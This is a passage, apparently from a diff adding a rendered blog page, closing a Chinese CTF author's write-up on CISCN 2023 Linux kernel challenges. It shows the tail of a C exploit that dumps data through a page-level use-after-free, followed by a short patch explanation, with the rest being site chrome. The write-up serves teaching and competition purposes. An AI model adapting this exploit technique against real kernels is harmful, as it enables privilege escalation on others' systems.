class="hljs-comment">/* enjoy page-level UAF now :) */</span><br>    read(vuln_pipe[<span class="hljs-number">0</span>], pipe_buf, <span class="hljs-number">0x700</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (<span class="hljs-number">0x700</span> / <span class="hljs-number">8</span>); i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[----data dump----][%d] %lx\n&quot;</span>, i, pipe_buf[i]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+</blockquote>
+<h2 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>漏洞修复其实比较简单，只需要把读取失败的基本块的跳转目标改到 <code>kfree()</code> 之后即可：</p>
+<p><img src="https://s2.loli.net/2023/07/14/qdhrM5PyWXYa1Bi.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p><img src="https://s2.loli.net/2023/07/14/cdaSR5grHwkG4PL.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03. 总结"></a>0x03. 总结</h1><p>感觉好像也没有什么好总结的…比较没啥亮点的两道套路题罢了…</p>
+<p><img src="https://s2.loli.net/2023/07/14/TmiUfboV49py2rP.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Linux/">#Linux</a>
+      
+        <a href="/tags/Linux-Kernel/">#Linux Kernel</a>
+      
+        <a href="/tags/Pwn/">#Pwn</a>
+      
+        <a href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/">#信息安全</a>
+      
+        <a href="/tags/CTF/">#CTF</a>
+      
+        <a href="/tags/CISCN/">#CISCN</a>
+      
+        <a href="/tags/UAF/">#UAF</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>【CTF.0x03】CISCN 2023 华东北分区赛 minidb、kkk 出题手记</div>
+      <div>http://blog.arttnba3.cn/2023/07/14/CTF-0X09_CISCN_2023_HDBFQS/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>arttnba3</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年7月14日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/06/04/CVE-0X0A-CVE-2021-3490/" title="【CVE.0x0A】CVE-2021-3490 漏洞复现及简要分析">
+                        <span class="hidden-mobile">【CVE.0x0A】CVE-2021-3490 漏洞复现及简要分析</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.4.17/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appid":"ICj6cPRQWFTNiOttBHlzxnIv-gzGzoHsz","appkey":"tuvJh3xYxPFcW2JB6K26RKP2","path":"window.location.pathname","placeholder":"说点什么呗（笑）","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false,"appId":"ICj6cPRQWFTNiOttBHlzxnIv-gzGzoHsz","appKey":"tuvJh3xYxPFcW2JB6K26RKP2"},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  <!-- 网站运行时间的设置 -->
+  <span id="timeDate">载入天数...</span>
+  <span id="times">载入时分秒...</span>
+  <script>
+      var now = new Date();
+      function createtime() {
+          var grt= new Date("04/20/2020 17:48:48");//此处修改你的建站时间或者网站上线时间
+          now.setTime(now.getTime()+250);
+          days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+          hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+          if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+          mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+          seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+          snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+          document.getElementById("timeDate").innerHTML = "arttnba3的小屋已经安全存在了 "+dnum+" 天 ";
+          document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+      }
+  setInterval("createtime()",250);
+  </script>
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.1/es5/tex-mml-chtml.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
